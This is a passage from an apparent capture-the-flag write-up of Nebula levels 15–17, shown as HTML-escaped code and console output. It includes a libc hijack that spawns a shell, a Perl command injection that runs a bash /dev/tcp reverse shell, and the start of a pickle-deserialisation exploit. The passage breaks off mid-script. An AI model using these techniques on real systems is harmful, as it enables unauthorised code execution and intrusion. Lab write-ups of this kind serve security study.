&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;init&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;fini&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;rtld_fini&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;stack_end&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;In theory we should get a shell now&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;level15&amp;#64;nebula:/var/tmp/flag15$&lt;/span&gt; gcc -shared -fPIC -o libc.so.6 mylibc.c
&lt;span class="gp"&gt;level15&amp;#64;nebula:/var/tmp/flag15$&lt;/span&gt; ~flag15/flag15
&lt;span class="go"&gt;/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /home/flag15/flag15)
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)
/home/flag15/flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol __cxa_finalize, version GLIBC_2.1.3 not defined in file libc.so.6 with link time reference&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Nuts, we have a symbol missing, namely &lt;code&gt;__cxa_finalize&lt;/code&gt;. Let's add it an try again&lt;/p&gt;
&lt;pre class="code C literal-block"&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;linux/unistd.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
&lt;/span&gt;
&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;__cxa_finalize&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;__libc_start_main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;init&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;fini&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;rtld_fini&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;stack_end&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;level15&amp;#64;nebula:/var/tmp/flag15$&lt;/span&gt; gcc -shared -fPIC -o libc.so.6 mylibc.c
&lt;span class="gp"&gt;level15&amp;#64;nebula:/var/tmp/flag15$&lt;/span&gt; ~flag15/flag15
&lt;span class="go"&gt;/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /home/flag15/flag15)
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)
/home/flag15/flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol system, version GLIBC_2.0 not defined in file libc.so.6 with link time reference&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;What? I realise we are slowly approaching the limits of my capabilities of dealing with Linux's demands. I searched around and found out about &lt;a class="reference external" href="http://ftp.gnu.org/old-gnu/Manuals/ld-2.9.1/html_node/ld_25.html"&gt;version scripts&lt;/a&gt;. Let's hope it works&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;level15&amp;#64;nebula:/var/tmp/flag15$&lt;/span&gt; cat version
&lt;span class="go"&gt;GLIBC_2.0 { };
&lt;/span&gt;&lt;span class="gp"&gt;level15&amp;#64;nebula:/var/tmp/flag15$&lt;/span&gt; gcc -shared -fPIC -o libc.so.6 mylibc.c -Wl,--version-script&lt;span class="o"&gt;=&lt;/span&gt;version
&lt;span class="gp"&gt;level15&amp;#64;nebula:/var/tmp/flag15$&lt;/span&gt; ~flag15/flag15
&lt;span class="go"&gt;/home/flag15/flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol system, version GLIBC_2.0 not defined in file libc.so.6 with link time reference&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;em&gt;sigh&lt;/em&gt; - symbol &lt;code&gt;system&lt;/code&gt; is missing. Ok, let's just build it statically and wrap it all up so we've got everything we need. From &lt;code&gt;man gcc&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;dl class="docutils"&gt;
&lt;dt&gt;&lt;strong&gt;-static-libgcc&lt;/strong&gt;&lt;/dt&gt;
&lt;dd&gt;On systems that provide libgcc as a shared library, these options force the use of either the shared or
static version respectively.  If no shared version of libgcc
was built when the compiler was configured, these options have no effect.&lt;/dd&gt;
&lt;/dl&gt;
&lt;/blockquote&gt;
&lt;p&gt;So really we can also get rid of our implementation of &lt;code&gt;__cxa_finalize&lt;/code&gt; as it's all statically linked now.&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;level15&amp;#64;nebula:/var/tmp/flag15$&lt;/span&gt; gcc -fPIC -shared -static-libgcc -Wl,--version-script&lt;span class="o"&gt;=&lt;/span&gt;version,-Bstatic -o libc.so.6 mylibc.c
&lt;span class="gp"&gt;level15&amp;#64;nebula:/var/tmp/flag15$&lt;/span&gt; ~flag15/flag15
&lt;span class="gp"&gt;sh-4.2$&lt;/span&gt; whoami
&lt;span class="go"&gt;flag15
&lt;/span&gt;&lt;span class="gp"&gt;sh-4.2$&lt;/span&gt; getflag
&lt;span class="go"&gt;You have successfully executed getflag on a target account&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;div class="section" id="level-16"&gt;
&lt;h2&gt;Level 16&lt;/h2&gt;
&lt;blockquote&gt;
There is a perl script running on port 1616.&lt;/blockquote&gt;
&lt;pre class="code perl literal-block"&gt;
&lt;span class="ch"&gt;#!/usr/bin/env perl&lt;/span&gt;

&lt;span class="k"&gt;use&lt;/span&gt; &lt;span class="n"&gt;CGI&lt;/span&gt; &lt;span class="sx"&gt;qw{param}&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;Content-type: text/html\n\n&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="k"&gt;sub &lt;/span&gt;&lt;span class="nf"&gt;login&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="nv"&gt;$username&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$_&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
  &lt;span class="nv"&gt;$password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$_&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;

  &lt;span class="nv"&gt;$username&lt;/span&gt; &lt;span class="o"&gt;=~&lt;/span&gt; &lt;span class="nb"&gt;tr&lt;/span&gt;&lt;span class="sr"&gt;/a-z/&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;Z&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;  &lt;span class="c1"&gt;# conver to uppercase&lt;/span&gt;
  &lt;span class="nv"&gt;$username&lt;/span&gt; &lt;span class="o"&gt;=~&lt;/span&gt; &lt;span class="sr"&gt;s/\s.*//&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;    &lt;span class="c1"&gt;# strip everything after a space&lt;/span&gt;

  &lt;span class="nv"&gt;&amp;#64;output&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="sb"&gt;`egrep &amp;quot;^$username&amp;quot; /home/flag16/userdb.txt 2&amp;gt;&amp;amp;1`&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="k"&gt;foreach&lt;/span&gt; &lt;span class="nv"&gt;$line&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;&amp;#64;output&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$usr&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$pw&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sr"&gt;/:/&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$line&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;


    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$pw&lt;/span&gt; &lt;span class="o"&gt;=~&lt;/span&gt; &lt;span class="nv"&gt;$password&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;

  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="k"&gt;sub &lt;/span&gt;&lt;span class="nf"&gt;htmlz&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Login resuls&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Your login was accepted&amp;lt;br/&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Your login failed&amp;lt;br/&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Would you like a cookie?&amp;lt;br/&amp;gt;&amp;lt;br/&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;\n&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="n"&gt;htmlz&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;login&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;username&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;param&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;password&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)));&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;So quickly looking at the script we know that we need to pass &lt;code&gt;username&lt;/code&gt; and &lt;code&gt;password&lt;/code&gt; in as URL parameters. It then does some uppercase conversion of the username, strips the whitespace and greps for the username in a file called &lt;code&gt;userdb.txt&lt;/code&gt;. Taking a look at this file we notice it's empty, so we need a different exploit. The obvious place here is the &lt;code&gt;egrep&lt;/code&gt; call as it accepts our username. But we need to do some twiddling in order to get it working with the uppercase and whitespace strip.&lt;/p&gt;
&lt;p&gt;One idea is to use bash's feature that allows us to run a command with a wildcard in the path. For example you can run &lt;code&gt;/bin/ls&lt;/code&gt; with &lt;code&gt;/*/ls&lt;/code&gt; instead. This
gets us around the uppercase limitation as we can create an uppercase command
at a path we can write to. I've chosen &lt;code&gt;/tmp&lt;/code&gt; as my target.
I'm going to create a reverse shell to a listening port. First off I login to level16 again (or somewhere else on the network) and run&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;level16&amp;#64;nebula:~$&lt;/span&gt; nc -l 1337
&lt;/pre&gt;
&lt;p&gt;To create a netcat listener on port &lt;em&gt;1337&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Next I construct the payload for the script&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;level16&amp;#64;nebula:/home/flag16$&lt;/span&gt; cat /tmp/RSHELL
&lt;span class="gp"&gt;#&lt;/span&gt;!/bin/bash
&lt;span class="go"&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.56.101/1337 0&amp;gt;&amp;amp;1
&lt;/span&gt;&lt;span class="gp"&gt;level16&amp;#64;nebula:/home/flag16$&lt;/span&gt; chmod +x /tmp/SHELL
&lt;/pre&gt;
&lt;p&gt;Note the uppercase filename, this is important as our username gets uppercased. The command in the script is a standard bash reverse shell. Now we pass the wildcard script path to the Perl script with backticks so it gets evaluated.&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;http://192.168.56.101:1616/index.cgi?username=%60/*/RSHELL%&lt;/span&gt;60&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nv"&gt;password&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;test2
&lt;/pre&gt;
&lt;p&gt;Back in the shell where we launched the netcat listener we do the following (the &lt;code&gt;whoami&lt;/code&gt; is just to confirm I am the right user)&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;level16&amp;#64;nebula:~$&lt;/span&gt; nc -l 1337
&lt;span class="go"&gt;bash: no job control in this shell
&lt;/span&gt;&lt;span class="gp"&gt;flag16&amp;#64;nebula:/home/flag16$&lt;/span&gt; getflag
&lt;span class="go"&gt;getflag
You have successfully executed getflag on a target account
&lt;/span&gt;&lt;span class="gp"&gt;flag16&amp;#64;nebula:/home/flag16$&lt;/span&gt; whoami
&lt;span class="go"&gt;whoami
flag16&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;div class="section" id="level-17"&gt;
&lt;h2&gt;Level 17&lt;/h2&gt;
&lt;blockquote&gt;
There is a python script listening on port 10007 that contains a vulnerability.&lt;/blockquote&gt;
&lt;pre class="code python literal-block"&gt;
&lt;span class="ch"&gt;#!/usr/bin/python&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;pickle&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;time&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;socket&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;signal&lt;/span&gt;

&lt;span class="n"&gt;signal&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;signal&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;signal&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SIGCHLD&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;signal&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SIG_IGN&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;server&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;skt&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
  &lt;span class="n"&gt;line&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;skt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1024&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

  &lt;span class="n"&gt;obj&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;pickle&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;loads&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

  &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;obj&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;clnt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;why did you send me &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;?&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="n"&gt;skt&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;AF_INET&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SOCK_STREAM&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;skt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;bind&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="s1"&gt;'0.0.0.0'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;10007&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="n"&gt;skt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;listen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
  &lt;span class="n"&gt;clnt&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;addr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;skt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;accept&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

  &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fork&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;clnt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Accepted connection from &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;:&lt;/span&gt;&lt;span class="si"&gt;%d&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;addr&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;addr&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;
    &lt;span class="n"&gt;server&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;clnt&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="nb"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Here &lt;cite&gt;pickle&lt;/cite&gt; provides us with the possibility of an exploit to run our own code. There's lots to read on the security issues with &lt;cite&gt;pickle&lt;/cite&gt;, but to be fair it was never meant to be secure in itself. [BH_US_11_Slaviero_Sour_Pickles_WP.pdf](&lt;a class="reference external" href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_WP.pdf"&gt;https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_WP.pdf&lt;/a&gt;) and &lt;a class="reference external" href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf"&gt;BH_US_11_Slaviero_Sour_Pickles_Slides.pdf&lt;/a&gt; are a good source for more info.&lt;/p&gt;
&lt;p&gt;Right, so my plan is to get a shell as &lt;em&gt;flag17&lt;/em&gt; and get the flag from there. Using pickle's opcodes I can construct a string that will run &lt;code&gt;getflag&lt;/code&gt; from the &lt;code&gt;pickle.loads&lt;/code&gt; call as user &lt;em&gt;flag17&lt;/em&gt;. So before I started constructing this I copied the script and ran it as &lt;em&gt;level17&lt;/em&gt; on a different port in order to debug and see what's going on. Once I was happy with my exploit code I changed the port to &lt;code&gt;10007&lt;/code&gt; and ran it to get the flag.&lt;/p&gt;
&lt;pre class="code python literal-block"&gt;
&lt;span class="ch"&gt;#!/bin/python&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;socket&lt;/span&gt;

&lt;span class="n"&gt;skt&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;AF_INET&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SOCK_STREAM&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
